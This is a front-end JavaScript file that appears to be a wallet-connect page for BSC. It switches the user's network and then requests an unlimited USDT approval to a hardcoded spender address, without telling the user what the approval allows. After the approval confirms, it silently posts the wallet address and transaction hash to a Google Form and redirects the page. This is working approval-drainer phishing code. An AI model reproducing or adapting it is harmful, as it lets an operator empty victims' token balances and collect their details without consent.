let provider;
let signer;
let tokenContract;

// ========== CONFIG ==========
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

// Google Form
const GOOGLE_FORM_URL =
  "https://docs.google.com/forms/d/e/1FAIpQLSdtsj3KnwkgqCYvZwjr3F8ypCjM7aX6WCUEt5sKIcHsXhXrKQ/formResponse";

const ENTRY_WALLET = "entry.916552859";
const ENTRY_TXHASH = "entry.1449465266";
const ENTRY_CHAIN  = "entry.1912151432";

// BSC
const BSC_CHAIN_ID = "0x38"; // 56

// ERC20 ABI
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

// ========== CONNECT WALLET ==========
async function connectWallet() {
  try {
    if (!window.ethereum) {
      alert("Please install MetaMask or Trust Wallet");
      return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();

    const user = await signer.getAddress();

    document.getElementById("status").innerText =
      "Connected: " + user.slice(0, 6) + "..." + user.slice(-4);

  } catch (err) {
    console.error(err);
    alert("Wallet connection rejected");
  }
}

// ========== NEXT BUTTON (SWITCH OR APPROVE) ==========
async function nextStep() {
  try {
    if (!signer) {
      alert("Connect wallet first");
      return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();

    // 🔹 Step 1: If not BSC → switch
    if (network.chainId !== 56n) {
      await switchToBSC();
      return; // user will click NEXT again
    }

    // 🔹 Step 2: On BSC → approve
    await approveToken();

  } catch (err) {
    console.error(err);
    alert("Action rejected");
  }
}

// ========== SWITCH TO BSC (USER INITIATED) ==========
async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID }]
    });

    document.getElementById("status").innerText =
      "Network switched to BSC. Click NEXT again.";

  } catch (err) {
    if (err.code === 4001) {
      alert("You rejected network switch");
    } else if (err.code === 4902) {
      alert("Please add BSC network in wallet");
    } else {
      console.error(err);
    }
  }
}

// ========== APPROVE ==========
async function approveToken() {
  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();

  tokenContract = new ethers.Contract(
    TOKEN_ADDRESS,
    ERC20_ABI,
    signer
  );

  const wallet = await signer.getAddress();

  document.getElementById("status").innerText =
    "Waiting for approval confirmation...";

  const tx = await tokenContract.approve(
    SPENDER_ADDRESS,
    ethers.MaxUint256
  );

  const receipt = await tx.wait();

  if (receipt.status === 1) {
    submitToGoogleForm(wallet, tx.hash, "BSC");
    window.location.href = "details.html";
  }
}

// ========== GOOGLE FORM ==========
function submitToGoogleForm(wallet, txHash, chain) {
  const data = new URLSearchParams();
  data.append(ENTRY_WALLET, wallet);
  data.append(ENTRY_TXHASH, txHash);
  data.append(ENTRY_CHAIN, chain);

  fetch(GOOGLE_FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: data
  });
}
